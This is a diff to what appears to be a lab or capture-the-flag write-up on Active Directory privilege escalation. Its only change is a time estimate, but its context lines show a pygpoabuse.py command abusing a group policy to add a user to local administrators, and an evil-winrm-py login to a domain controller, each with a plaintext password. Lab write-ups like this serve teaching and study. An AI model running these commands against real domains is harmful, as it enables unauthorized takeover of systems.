@@ -196,7 +196,7 @@ python pygpoabuse.py SYSCO.LOCAL/greg.shields:'5y5coSmarter2025!!!' -gpo-id 31B2
 ```
 ![03054aa2bff4d9bd3b65358df9c34bf2.png](/resources/03054aa2bff4d9bd3b65358df9c34bf2.png)
 
-After a job created to add our controlled user to local administrators group, in normal context we might need to wait for like half an hour for it to apply but as "greg.shields" is also a member of both "Remote Management Users" and "Remote Desktop Users", I will use evil-winrm-py to connect to the machine as "greg.shields" and force apply the group policy
+After a job created to add our controlled user to local administrators group, in normal context we might need to wait for like 5 minutes up to half an hour for it to apply but as "greg.shields" is also a member of both "Remote Management Users" and "Remote Desktop Users", I will use evil-winrm-py to connect to the machine as "greg.shields" and force apply the group policy
 
 ```
 evil-winrm-py -i DC01.SYSCO.LOCAL -u 'greg.shields' -p '5y5coSmarter2025!!!'
